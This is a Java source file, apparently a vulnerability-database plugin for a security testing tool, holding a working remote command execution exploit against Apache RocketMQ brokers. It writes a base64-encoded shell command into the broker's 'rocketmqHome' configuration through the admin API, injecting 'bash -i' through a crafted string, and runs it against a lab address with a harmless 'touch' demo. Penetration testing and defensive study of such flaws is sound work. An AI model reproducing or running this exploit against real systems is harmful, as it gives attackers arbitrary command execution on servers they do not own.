package me.gv7.woodpecker.vuldb;

import org.apache.rocketmq.client.exception.MQBrokerException;
import org.apache.rocketmq.client.exception.MQClientException;
import org.apache.rocketmq.remoting.exception.RemotingConnectException;
import org.apache.rocketmq.remoting.exception.RemotingSendRequestException;
import org.apache.rocketmq.remoting.exception.RemotingTimeoutException;
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.io.UnsupportedEncodingException;
import java.util.Base64;
import java.util.Properties;

public class PayloadGenerator {

    public String getCmd(String cmd){
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }

    public static void updateConfig(String url, String cmd) throws MQClientException, RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException {
        Properties properties = new Properties();
        properties.setProperty("rocketmqHome", cmd);
        properties.setProperty("filterServerNums","1");

        DefaultMQAdminExt adminExt = new DefaultMQAdminExt();
        adminExt.setNamesrvAddr("localhost:9876");
        adminExt.start();

        adminExt.updateBrokerConfig(url, properties);
        Properties brokerConfig = adminExt.getBrokerConfig(url);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));

        adminExt.shutdown();
    }

    public static void main(String[] args) throws RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException, MQClientException {
        String url = "192.168.178.128:10911";
        PayloadGenerator payloadGenerator = new PayloadGenerator();
        updateConfig(url, payloadGenerator.getCmd("touch /tmp/1111"));
    }
}
